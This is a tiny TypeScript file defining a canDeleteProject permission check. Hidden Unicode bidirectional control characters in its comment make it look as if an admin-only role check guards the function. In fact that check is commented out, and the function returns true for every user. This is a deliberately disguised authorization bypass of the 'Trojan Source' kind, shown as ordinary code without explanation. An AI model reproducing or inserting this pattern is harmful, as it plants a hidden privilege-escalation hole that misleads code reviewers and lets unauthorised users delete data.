type User = { id: string; role: "admin" | "member" };

export function canDeleteProject(user: User): boolean {
  /*‮ } if (user.role !== "admin") ⁦begin admins only */ return true;
  return false;
}
